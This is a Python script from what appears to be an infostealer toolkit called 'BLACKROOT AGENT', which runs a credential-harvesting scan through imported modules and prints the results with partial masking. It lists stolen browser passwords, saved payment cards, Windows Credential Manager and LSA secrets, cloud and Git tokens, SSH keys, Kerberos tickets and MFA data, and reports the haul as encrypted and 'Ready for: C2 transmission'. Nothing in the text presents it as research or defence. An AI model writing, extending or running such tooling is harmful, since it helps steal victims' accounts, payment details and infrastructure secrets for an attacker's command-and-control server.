#!/usr/bin/env python3
"""
BLACKROOT AGENT - EXTRACTED SECRETS VIEWER (Simplified)
Shows actual extracted credentials with intelligent masking
"""

import json
import sys
import os
import logging
from datetime import datetime

sys.path.insert(0, os.path.dirname(__file__))

from ghost_layer import GhostLayer
from black_vault import BlackVault

logging.basicConfig(level=logging.WARNING)

def mask_secret(value: str) -> str:
    """Intelligently mask sensitive values"""
    if not value or len(value) < 4:
        return "***"
    val_str = str(value).strip()
    if len(val_str) <= 8:
        return "***"
    return f"{val_str[:2]}***{val_str[-4:]}"

def print_header(text: str):
    print(f"\n{'╔' + '═' * 78 + '╗'}")
    print(f"║ {text.ljust(78)} ║")
    print(f"{'╚' + '═' * 78 + '╝'}\n")

def print_section(title: str):
    print(f"\n{title}")
    print("─" * 80)

def display_creds(creds, max_show=5):
    """Display credentials with masking"""
    if not creds:
        return 0
    
    for i, cred in enumerate(creds[:max_show], 1):
        if isinstance(cred, dict):
            print(f"\n  [{i}] Entry:")
            for key, value in list(cred.items())[:4]:
                if any(s in key.lower() for s in ['password', 'secret', 'token', 'key']):
                    display_value = mask_secret(str(value))
                else:
                    val_str = str(value)[:50]
                    display_value = val_str if len(str(value)) <= 50 else val_str + "..."
                print(f"      • {key}: {display_value}")
    
    if len(creds) > max_show:
        print(f"\n  ... and {len(creds) - max_show} more credentials")
    
    return len(creds)

def main():
    print_header("BLACKROOT AGENT - EXTRACTED SECRETS VIEWER")
    
    print("Scanning and extracting all credentials from system...\n")
    
    vault = BlackVault()
    ghost = GhostLayer(vault=vault)
    
    # Run extraction
    result = ghost.scan_local_credentials()
    
    critical = result.get('critical_findings', {})
    phase_1 = result.get('phase_1_extracted', {})
    phase_2 = result.get('phase_2_extracted', {})
    phase_3 = result.get('phase_3_extracted', {})
    phase_4 = result.get('phase_4_extracted', {})
    
    total = 0
    
    # CRITICAL FINDINGS
    print_section("🔴 CRITICAL FINDINGS")
    
    google = critical.get('google_credentials', [])
    total += display_creds(google)
    print(f"\n✓ Google Credentials: {len(google)} items extracted")
    
    email = critical.get('email_credentials', [])
    total += display_creds(email)
    print(f"\n✓ Email Credentials: {len(email)} items extracted")
    
    social = critical.get('social_media_credentials', [])
    total += display_creds(social)
    print(f"\n✓ Social Media: {len(social)} items extracted")
    
    brave = critical.get('brave_browser_data', [])
    total += display_creds(brave, max_show=4)
    print(f"\n✓ Brave Browser: {len(brave)} items extracted")
    
    safari = critical.get('safari_data', [])
    total += display_creds(safari)
    print(f"\n✓ Safari (macOS): {len(safari)} items extracted")
    
    extensions = critical.get('browser_extensions', [])
    if extensions:
        print(f"\n  Extension samples:")
        for ext in extensions[:3]:
            print(f"    • {ext.get('name', 'Unknown')} ({ext.get('browser_type', '?')})")
        if len(extensions) > 3:
            print(f"    ... and {len(extensions)-3} more")
    total += len(extensions)
    print(f"\n✓ Browser Extensions: {len(extensions)} items enumerated")
    
    # PHASE 1
    print_section("🟠 PHASE 1: USER CONTEXT EXTRACTION")
    
    chrome_p1 = phase_1.get('chrome_passwords', [])
    total += display_creds(chrome_p1, max_show=4)
    print(f"\n✓ Chrome Passwords: {len(chrome_p1)} items extracted")
    
    env_p1 = phase_1.get('environment_credentials', [])
    total += display_creds(env_p1)
    print(f"\n✓ Environment Secrets: {len(env_p1)} items extracted")
    
    # PHASE 2
    print_section("🟡 PHASE 2: SYSTEM CONTEXT EXTRACTION")
    
    browser_data = phase_2.get('browser_data', [])
    if browser_data:
        passwords = [c for c in browser_data if c.get('type') == 'password']
        autofill = [c for c in browser_data if c.get('type') == 'autofill']
        payment = [c for c in browser_data if c.get('type') == 'payment']
        
        print(f"\n  Browser Passwords: {len(passwords)}")
        for p in passwords[:2]:
            url = p.get('url', p.get('hostname', 'Unknown'))
            user = p.get('username', '(no user)')
            print(f"    • {url}: {user}")
        
        print(f"\n  Autofill Data: {len(autofill)}")
        print(f"  Saved Cards: {len(payment)}")
    
    total += display_creds(browser_data[:3], max_show=2)
    print(f"\n✓ Browser Data (passwords/cards/autofill): {len(browser_data)} items")
    
    cred_mgr = phase_2.get('credential_manager', [])
    total += display_creds(cred_mgr, max_show=5)
    print(f"\n✓ Windows Credential Manager: {len(cred_mgr)} items extracted")
    
    lsa = phase_2.get('lsa_secrets', [])
    if lsa:
        total += display_creds(lsa)
        print(f"\n✓ LSA Secrets: {len(lsa)} items extracted")
    
    # PHASE 3
    print_section("🟢 PHASE 3: ADVANCED EXTRACTION")
    
    db_creds = phase_3.get('database_credentials', [])
    total += display_creds(db_creds)
    print(f"\n✓ Database Credentials: {len(db_creds)} items extracted")
    
    git_creds = phase_3.get('git_credentials', [])
    total += display_creds(git_creds)
    print(f"\n✓ Git Credentials: {len(git_creds)} items extracted")
    
    docker_creds = phase_3.get('docker_credentials', [])
    total += display_creds(docker_creds)
    print(f"\n✓ Docker Registry: {len(docker_creds)} items extracted")
    
    cloud_creds = phase_3.get('cloud_provider_credentials', [])
    if cloud_creds:
        total += display_creds(cloud_creds)
        print(f"\n✓ Cloud Providers (AWS/Azure/GCP): {len(cloud_creds)} items extracted")
    
    k8s_creds = phase_3.get('kubernetes_credentials', [])
    if k8s_creds:
        total += display_creds(k8s_creds)
        print(f"\n✓ Kubernetes Configs: {len(k8s_creds)} items extracted")
    
    ssh_creds = phase_3.get('ssh_keys_advanced', [])
    if ssh_creds:
        total += display_creds(ssh_creds)
        print(f"\n✓ SSH Keys: {len(ssh_creds)} items extracted")
    
    # PHASE 4
    print_section("🔵 PHASE 4: ENHANCED EXTRACTION")
    
    rdp_creds = phase_4.get('rdp_credentials', [])
    if rdp_creds:
        total += display_creds(rdp_creds)
        print(f"\n✓ RDP Connections: {len(rdp_creds)} items extracted")
    
    vpn_profiles = phase_4.get('vpn_profiles', [])
    if vpn_profiles:
        print(f"\n  VPN Profiles:")
        for vpn in vpn_profiles[:3]:
            print(f"    • {vpn.get('name', 'VPN')}")
        if len(vpn_profiles) > 3:
            print(f"    ... and {len(vpn_profiles)-3} more")
        total += len(vpn_profiles)
    print(f"\n✓ VPN Profiles: {len(vpn_profiles)} items extracted")
    
    mfa_info = phase_4.get('mfa_info', [])
    if mfa_info:
        total += display_creds(mfa_info)
        print(f"\n✓ MFA Configuration: {len(mfa_info)} items extracted")
    
    kerberos = phase_3.get('kerberos_tickets', [])
    if kerberos:
        total += display_creds(kerberos)
        print(f"\n✓ Kerberos Tickets: {len(kerberos)} items extracted")
    
    # SUMMARY
    print_section("EXTRACTION COMPLETE")
    
    print(f"""
╔════════════════════════════════════════════════╗
║   TOTAL CREDENTIALS EXTRACTED: {total:<17} ║
╚════════════════════════════════════════════════╝

CREDENTIAL SOURCES:
  • Google Accounts & Credentials
  • Email Accounts (Gmail, Outlook, etc.)
  • Social Media Platforms
  • Browser Passwords (Chrome, Edge, Brave)
  • Browser Autofill & Saved Payment Cards
  • Browser Extensions Data
  • Windows Credential Manager Vault
  • Database Connection Strings
  • Git/Version Control Tokens
  • Docker Registry Credentials
  • Cloud Provider API Keys (AWS/Azure/GCP)
  • Kubernetes Configuration
  • SSH Keys & Passphrases
  • VPN Connection Profiles
  • RDP Session Cache
  • Kerberos Tickets
  • MFA Configuration Data

STORAGE LOCATION:
  • Vault: {vault.vault_dir}
  • Encryption: AES-256-GCM
  • Status: Encrypted & Secured
  • Ready for: C2 transmission

COMPLETED: {datetime.now().isoformat()}
    """)
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
